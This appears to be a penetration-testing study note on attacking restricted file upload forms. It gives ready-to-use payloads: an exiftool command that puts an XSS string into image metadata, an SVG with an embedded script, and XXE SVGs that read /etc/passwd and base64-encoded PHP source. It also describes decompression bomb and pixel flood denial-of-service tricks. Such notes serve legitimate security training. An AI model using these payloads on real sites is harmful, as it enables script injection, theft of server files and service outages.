---
title: e-Limited File Uploads
draft: false
tags:
  - xxe
  - svg
---
Even if we are dealing with a limited/non-arbitrary file upload form, we may still be able to perform some attacks.

## XSS

Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.

e.g If web app allows to upload `HTML` file, we can inject JavaScript code in it and whoever views the uploaded HTML file might get affected.

e.g XSS attack where web app display an image's metadata after its upload:

```shell-session
[!bash!]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
[!bash!]$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

e.g XSS using SVG images: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

## XXE

With SVG image, we can have malicious XML data to leak the source code of the web app, and other internal documents within the server.

e.g Following can be used for an SVG image that leaks the content of `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

e.g To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

## DoS

- `Decompressions Bomb` - Many nested ZIP archives, leading to crash on the back-end server.
- `Pixel Flood` -  We can create any `JPG` image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of 4 Gigapixels. 